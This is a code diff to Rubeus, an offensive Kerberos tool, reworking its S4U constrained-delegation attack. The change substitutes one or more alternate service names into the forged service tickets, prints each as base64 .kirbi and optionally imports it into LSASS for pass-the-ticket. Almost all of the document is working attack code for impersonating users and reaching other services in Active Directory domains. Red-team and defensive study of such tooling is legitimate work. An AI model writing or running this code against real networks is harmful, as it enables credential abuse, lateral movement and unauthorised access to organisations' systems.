@@ -52,7 +52,15 @@ namespace Rubeus
             Console.WriteLine("[*]   Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
             if (!String.IsNullOrEmpty(altService))
             {
-                Console.WriteLine("[*]   Final ticket will be for the alternate service '{0}'", altService);
+                string[] altSnames = altService.Split(',');
+                if (altSnames.Length == 1)
+                {
+                    Console.WriteLine("[*]   Final ticket will be for the alternate service '{0}'", altService);
+                }
+                else
+                {
+                    Console.WriteLine("[*]   Final tickets will be for the alternate services '{0}'", altService);
+                }
             }
 
             byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, false, targetUser);
@@ -95,11 +103,12 @@ namespace Rubeus
                 s4u2proxyReq.req_body.realm = domain;
 
                 string[] parts = targetSPN.Split('/');
+                string serverName = parts[1];
                 s4u2proxyReq.req_body.sname.name_type = 2;
                 // the sname
                 s4u2proxyReq.req_body.sname.name_string.Add(parts[0]);
                 // the server
-                s4u2proxyReq.req_body.sname.name_string.Add(parts[1]);
+                s4u2proxyReq.req_body.sname.name_string.Add(serverName);
 
                 // supported encryption types
                 s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
@@ -137,78 +146,151 @@ namespace Rubeus
                     AsnElt ae2 = AsnElt.Decode(outBytes2, false);
                     EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);
 
-                    // now build the final KRB-CRED structure
-                    KRB_CRED cred = new KRB_CRED();
-
-                    // if we want an alternate sname, first substitute it into the ticket structure
                     if (!String.IsNullOrEmpty(altService))
                     {
-                        rep2.ticket.sname.name_string[0] = altService;
+                        string[] altSnames = altService.Split(',');
+
+                        foreach (string altSname in altSnames)
+                        {
+                            // now build the final KRB-CRED structure with one or more alternate snames
+                            KRB_CRED cred = new KRB_CRED();
+
+                            // since we want an alternate sname, first substitute it into the ticket structure
+                            rep2.ticket.sname.name_string[0] = altSname;
+
+                            // add the ticket
+                            cred.tickets.Add(rep2.ticket);
+
+                            // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
+
+                            KrbCredInfo info = new KrbCredInfo();
+
+                            // [0] add in the session key
+                            info.key.keytype = encRepPart2.key.keytype;
+                            info.key.keyvalue = encRepPart2.key.keyvalue;
+
+                            // [1] prealm (domain)
+                            info.prealm = encRepPart2.realm;
+
+                            // [2] pname (user)
+                            info.pname.name_type = rep2.cname.name_type;
+                            info.pname.name_string = rep2.cname.name_string;
+
+                            // [3] flags
+                            info.flags = encRepPart2.flags;
+
+                            // [4] authtime (not required)
+
+                            // [5] starttime
+                            info.starttime = encRepPart2.starttime;
+
+                            // [6] endtime
+                            info.endtime = encRepPart2.endtime;
+
+                            // [7] renew-till
+                            info.renew_till = encRepPart2.renew_till;
+
+                            // [8] srealm
+                            info.srealm = encRepPart2.realm;
+
+                            // [9] sname
+                            info.sname.name_type = encRepPart2.sname.name_type;
+                            info.sname.name_string = encRepPart2.sname.name_string;
+
+                            // if we want an alternate sname, substitute it into the encrypted portion of the KRB_CRED
+                            Console.WriteLine("\r\n[*] Substituting alternative service name '{0}'", altSname);
+                            info.sname.name_string[0] = altSname;
+
+                            // add the ticket_info into the cred object
+                            cred.enc_part.ticket_info.Add(info);
+
+                            byte[] kirbiBytes = cred.Encode().Encode();
+
+                            string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+                            Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}/{1}':\r\n", altSname, serverName);
+
+                            // display the .kirbi base64, columns of 80 chararacters
+                            foreach (string line in Helpers.Split(kirbiString, 80))
+                            {
+                                Console.WriteLine("      {0}", line);
+                            }
+                            if (ptt)
+                            {
+                                // pass-the-ticket -> import into LSASS
+                                LSA.ImportTicket(kirbiBytes);
+                            }
+                        }
                     }
-
-                    // add the ticket
-                    cred.tickets.Add(rep2.ticket);
-
-                    // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
-
-                    KrbCredInfo info = new KrbCredInfo();
-
-                    // [0] add in the session key
-                    info.key.keytype = encRepPart2.key.keytype;
-                    info.key.keyvalue = encRepPart2.key.keyvalue;
-
-                    // [1] prealm (domain)
-                    info.prealm = encRepPart2.realm;
-
-                    // [2] pname (user)
-                    info.pname.name_type = rep2.cname.name_type;
-                    info.pname.name_string = rep2.cname.name_string;
-
-                    // [3] flags
-                    info.flags = encRepPart2.flags;
-
-                    // [4] authtime (not required)
-
-                    // [5] starttime
-                    info.starttime = encRepPart2.starttime;
-
-                    // [6] endtime
-                    info.endtime = encRepPart2.endtime;
-
-                    // [7] renew-till
-                    info.renew_till = encRepPart2.renew_till;
-
-                    // [8] srealm
-                    info.srealm = encRepPart2.realm;
-
-                    // [9] sname
-                    info.sname.name_type = encRepPart2.sname.name_type;
-                    info.sname.name_string = encRepPart2.sname.name_string;
-                    // if we want an alternate sname, lastely substitute it into the encrypted portion of the KRB_CRED
-                    if (!String.IsNullOrEmpty(altService))
+                    else
                     {
-                        Console.WriteLine("[*] Substituting alternative service name '{0}'", altService);
-                        info.sname.name_string[0] = altService;
-                    }
+                        // now build the final KRB-CRED structure, no alternate snames
+                        KRB_CRED cred = new KRB_CRED();
 
-                    // add the ticket_info into the cred object
-                    cred.enc_part.ticket_info.Add(info);
+                        // if we want an alternate sname, first substitute it into the ticket structure
+                        if (!String.IsNullOrEmpty(altService))
+                        {
+                            rep2.ticket.sname.name_string[0] = altService;
+                        }
 
-                    byte[] kirbiBytes = cred.Encode().Encode();
+                        // add the ticket
+                        cred.tickets.Add(rep2.ticket);
 
-                    string kirbiString = Convert.ToBase64String(kirbiBytes);
+                        // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
 
-                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
+                        KrbCredInfo info = new KrbCredInfo();
 
-                    // display the .kirbi base64, columns of 80 chararacters
-                    foreach (string line in Helpers.Split(kirbiString, 80))
-                    {
-                        Console.WriteLine("      {0}", line);
-                    }
-                    if (ptt)
-                    {
-                        // pass-the-ticket -> import into LSASS
-                        LSA.ImportTicket(kirbiBytes);
+                        // [0] add in the session key
+                        info.key.keytype = encRepPart2.key.keytype;
+                        info.key.keyvalue = encRepPart2.key.keyvalue;
+
+                        // [1] prealm (domain)
+                        info.prealm = encRepPart2.realm;
+
+                        // [2] pname (user)
+                        info.pname.name_type = rep2.cname.name_type;
+                        info.pname.name_string = rep2.cname.name_string;
+
+                        // [3] flags
+                        info.flags = encRepPart2.flags;
+
+                        // [4] authtime (not required)
+
+                        // [5] starttime
+                        info.starttime = encRepPart2.starttime;
+
+                        // [6] endtime
+                        info.endtime = encRepPart2.endtime;
+
+                        // [7] renew-till
+                        info.renew_till = encRepPart2.renew_till;
+
+                        // [8] srealm
+                        info.srealm = encRepPart2.realm;
+
+                        // [9] sname
+                        info.sname.name_type = encRepPart2.sname.name_type;
+                        info.sname.name_string = encRepPart2.sname.name_string;
+
+                        // add the ticket_info into the cred object
+                        cred.enc_part.ticket_info.Add(info);
+
+                        byte[] kirbiBytes = cred.Encode().Encode();
+
+                        string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+                        Console.WriteLine("\r\n[*] base64(ticket.kirbi) for SPN '{0}':\r\n", targetSPN);
+
+                        // display the .kirbi base64, columns of 80 chararacters
+                        foreach (string line in Helpers.Split(kirbiString, 80))
+                        {
+                            Console.WriteLine("      {0}", line);
+                        }
+                        if (ptt)
+                        {
+                            // pass-the-ticket -> import into LSASS
+                            LSA.ImportTicket(kirbiBytes);
+                        }
                     }
                 }
                 else if (responseTag == 30)
